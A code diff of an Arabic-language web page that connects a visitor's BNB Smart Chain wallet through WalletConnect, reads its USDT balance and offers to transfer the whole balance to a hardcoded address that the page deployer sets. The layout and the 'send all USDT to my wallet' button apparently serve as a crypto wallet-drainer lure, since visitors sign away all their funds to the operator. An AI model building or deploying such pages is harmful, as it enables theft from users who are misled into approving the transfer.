@@ -3,67 +3,68 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>إرسال USDT على BSC</title>
+<title>ربط محفظة BSC عبر WalletConnect وإرسال USDT</title>
 <style>
   body {
     font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-    background: #1e1e2f;
-    color: #eee;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
+    background: #121212;
+    color: #e0e0e0;
     padding: 40px 20px;
+    text-align: center;
   }
   h2 {
-    margin-bottom: 25px;
-    color: #7fffd4;
+    color: #00ffc8;
   }
   button {
-    padding: 12px 24px;
+    margin: 15px 0;
+    padding: 12px 30px;
     font-size: 18px;
-    background-color: #7fffd4;
     border: none;
     border-radius: 8px;
+    background: #00ffc8;
+    color: #121212;
     cursor: pointer;
     transition: background-color 0.3s ease;
-    color: #1e1e2f;
-    margin-top: 15px;
   }
   button:disabled {
-    background-color: #555;
+    background: #555;
     cursor: not-allowed;
   }
   #walletAddress, #usdtBalance, #status {
-    margin-top: 15px;
+    margin-top: 20px;
     font-weight: bold;
-  }
-  #status {
-    min-height: 40px;
   }
 </style>
 </head>
 <body>
 
-<h2>ربط محفظتك على Binance Smart Chain وإرسال USDT</h2>
+<h2>ربط محفظة BSC عبر WalletConnect وإرسال USDT</h2>
 
-<button id="connectBtn">ربط المحفظة</button>
-<div id="walletAddress"></div>
-<div id="usdtBalance"></div>
+<button id="connectBtn">ربط المحفظة</button><br/>
 <button id="sendBtn" disabled>إرسال كل USDT إلى محفظتي</button>
 
+<div id="walletAddress"></div>
+<div id="usdtBalance"></div>
 <div id="status"></div>
 
+<!-- مكتبات WalletConnect و ethers.js -->
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
 <script>
   const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT على BSC
-  const recipientAddress = "ضع_هنا_عنوان_محفظتك"; // غيره هنا
+  const recipientAddress = "ضع_هنا_عنوان_محفظتك"; // عدله إلى عنوان محفظتك
 
   const usdtAbi = [
     "function balanceOf(address owner) view returns (uint256)",
     "function transfer(address to, uint amount) returns (bool)"
   ];
 
-  let provider, signer, userAddress, contract;
+  let provider;
+  let web3Provider;
+  let signer;
+  let contract;
+  let userAddress;
 
   const connectBtn = document.getElementById("connectBtn");
   const sendBtn = document.getElementById("sendBtn");
@@ -73,37 +74,50 @@
 
   connectBtn.onclick = async () => {
     try {
-      if (!window.ethereum) throw new Error("يرجى تثبيت MetaMask!");
+      // تهيئة WalletConnect provider مع RPC الخاص بـ BSC
+      provider = new WalletConnectProvider.default({
+        rpc: {
+          56: "https://bsc-dataseed.binance.org/"
+        },
+        chainId: 56,
+      });
 
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
+      // فتح اتصال، يعرض QR code أو يفتح تلقائيًا على الهاتف
+      await provider.enable();
+
+      web3Provider = new ethers.providers.Web3Provider(provider);
+      signer = web3Provider.getSigner();
       userAddress = await signer.getAddress();
 
       walletAddressDiv.textContent = "محفظتك: " + userAddress;
-
-      const network = await provider.getNetwork();
-      if (network.chainId !== 56) throw new Error("يرجى التبديل إلى شبكة Binance Smart Chain في MetaMask.");
+      statusDiv.textContent = "";
 
       contract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+
+      // جلب رصيد USDT
       const balance = await contract.balanceOf(userAddress);
       const formattedBalance = ethers.utils.formatUnits(balance, 18);
-
       usdtBalanceDiv.textContent = "رصيد USDT: " + formattedBalance;
 
       sendBtn.disabled = balance.isZero();
-      statusDiv.textContent = "";
+
+      // التعامل مع قطع الاتصال
+      provider.on("disconnect", (code, reason) => {
+        walletAddressDiv.textContent = "";
+        usdtBalanceDiv.textContent = "";
+        statusDiv.textContent = "تم قطع الاتصال بالمحفظة.";
+        sendBtn.disabled = true;
+      });
+
     } catch (err) {
-      statusDiv.textContent = err.message || err;
-      sendBtn.disabled = true;
-      walletAddressDiv.textContent = "";
-      usdtBalanceDiv.textContent = "";
+      statusDiv.textContent = "خطأ: " + (err.message || err);
     }
   };
 
   sendBtn.onclick = async () => {
     try {
       statusDiv.textContent = "جارٍ إرسال المعاملة، يرجى الانتظار...";
+
       const balance = await contract.balanceOf(userAddress);
       if (balance.isZero()) {
         statusDiv.textContent = "رصيدك صفر، لا يوجد ما يتم إرساله.";
